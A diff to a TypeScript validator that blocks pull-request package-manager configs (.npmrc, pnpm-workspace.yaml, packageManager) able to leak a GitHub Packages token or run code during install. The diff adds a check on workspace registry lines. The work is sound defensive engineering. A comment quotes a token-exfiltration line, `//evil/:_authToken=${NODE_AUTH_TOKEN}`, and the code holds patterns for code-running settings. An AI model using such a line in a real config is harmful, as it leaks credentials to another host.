@@ -5,7 +5,8 @@
  * pnpmfiles off. what's left for a PR is its own package-manager config, so this refuses any that
  * could hand the token to another host or run code during the install:
  * - auth settings or `${…}` env interpolation in .npmrc (`//evil/:_authToken=${NODE_AUTH_TOKEN}`)
- * - an `@touchlesscode` registry other than GitHub Packages
+ * - an `@touchlesscode` registry other than GitHub Packages; pnpm-workspace.yaml names GitHub Packages only in
+ *   `registries:` as `'@touchlesscode': https://npm.pkg.github.com`, the .npmrc line's twin (exo since EXO-8588)
  * - npm/pnpm settings that run code or swap the config files (node-options, script-shell, pnpmfile, …)
  * - a `packageManager` that isn't a plain `<name>@<version>` (pnpm downloads and runs that version)
  *
@@ -33,6 +34,22 @@ export const npmrcProblemsOf = (text: string, path = ".npmrc") =>
     ].filter((problem): problem is string => problem !== undefined)
   })
 
+const touchlesscodeRegistry = /^\s+(['"]?)@touchlesscode\1\s*:\s*(['"]?)https:\/\/npm\.pkg\.github\.com\/?\2\s*(?:#.*)?$/
+
+/** problems with registries in pnpm-workspace.yaml, by line: GitHub Packages only as the `@touchlesscode` scope's, and that scope nowhere else */
+export const workspaceRegistryProblemsOf = (text: string, path = "pnpm-workspace.yaml") => {
+  let section = ""
+  return text.split(/\r?\n/).flatMap((line, index) => {
+    if (/^[^\s#]/.test(line)) section = line.replace(/:.*$/, "").trim()
+    const where = `${path}:${index + 1}`
+    const allowed = section === "registries" && touchlesscodeRegistry.test(line)
+    return [
+      /npm\.pkg\.github\.com/.test(line) && !allowed ? `${where} names GitHub Packages other than as registries' '@touchlesscode': https://npm.pkg.github.com` : undefined,
+      section === "registries" && /@touchlesscode/.test(line) && !allowed ? `${where} points @touchlesscode at a registry other than https://npm.pkg.github.com` : undefined,
+    ].filter((problem): problem is string => problem !== undefined)
+  })
+}
+
 /** every reason the packages token must not reach this repo's install; empty when it's safe */
 export const packagesTokenProblemsOf = (repo: RepoSnapshot) => {
   const npmrc = repo.readText(".npmrc")
@@ -46,7 +63,8 @@ export const packagesTokenProblemsOf = (repo: RepoSnapshot) => {
   return [
     ...(npmrc ? npmrcProblemsOf(npmrc) : []),
     /^\s*(?:pnpmfile|globalPnpmfile|npmrcAuthFile|configDependencies)\s*:/m.test(workspace) ? "pnpm-workspace.yaml sets a pnpmfile, auth file or config dependencies, which can run code during install" : undefined,
-    /npm\.pkg\.github\.com|_authToken|\$\{/.test(workspace) ? "pnpm-workspace.yaml carries registry auth or env interpolation" : undefined,
+    /_authToken|\$\{/.test(workspace) ? "pnpm-workspace.yaml carries registry auth or env interpolation" : undefined,
+    ...workspaceRegistryProblemsOf(workspace),
     packageManager !== undefined && (typeof packageManager !== "string" || !packageManagerPattern.test(packageManager)) ? `package.json packageManager "${String(packageManager)}" isn't <name>@<version>` : undefined,
   ].filter((problem): problem is string => problem !== undefined)
 }
